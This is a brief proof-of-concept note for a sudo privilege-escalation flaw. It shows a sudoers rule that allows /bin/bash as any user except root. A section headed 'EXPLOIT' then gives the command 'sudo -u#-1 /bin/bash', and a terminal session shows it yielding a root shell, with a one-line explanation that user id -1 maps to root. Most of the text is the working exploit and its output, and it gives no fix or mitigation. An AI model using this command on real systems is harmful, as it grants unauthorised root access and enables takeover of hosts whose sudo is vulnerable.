sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash


So user hacker can't run /bin/bash as root (!root)


User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash


With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT: 

sudo -u#-1 /bin/bash

Example : 

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#

Description :
Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id

and /bin/bash is executed with root permission
